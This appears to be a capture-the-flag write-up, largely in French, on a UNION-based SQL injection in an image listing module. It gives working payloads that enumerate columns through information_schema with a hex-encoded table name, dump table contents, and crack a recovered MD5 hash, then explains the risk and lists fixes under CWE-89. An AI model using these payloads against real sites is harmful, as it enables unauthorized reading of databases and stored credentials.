## SQL Injection (UNION-based sur module images)

- `0x6C6973745F696D61676573` = `list_images`

List columns in **list_images** tables:
- `5 UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 0x6C6973745F696D61676573 --`

List variables value in **list_images**:
`4 UNION SELECT title,comment FROM list_images --`

```
ID: 4 UNION SELECT title,comment FROM list_images -- 
Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Url : Hack me ?
```

Crack this hash on crackstation:
`1928e8083cf461a51303633093573c46` = `albatroz`

### Ce que ça implique / pourquoi c’est dangereux
L’attaque utilise une injection SQL avec `UNION SELECT` pour interroger la table `list_images` (nom encodé en hexadécimal afin de contourner des filtres simples).

L’attaquant peut ainsi :

- Lister les colonnes via `information_schema`
- Lire le contenu des tables
- Récupérer des hashes stockés
- Exploiter des messages internes pour résoudre des défis ou accéder à d’autres zones

Cela montre un **accès non autorisé complet aux données** de la base.

### Comment la corriger
- Utiliser uniquement des **requêtes préparées**
- Valider strictement le type des paramètres (ex : ID numérique)
- Ne jamais concaténer les entrées utilisateur
- Limiter les privilèges du compte SQL
- Masquer les messages d’erreur en production

### Type de CWE
- **CWE-89** — SQL Injection
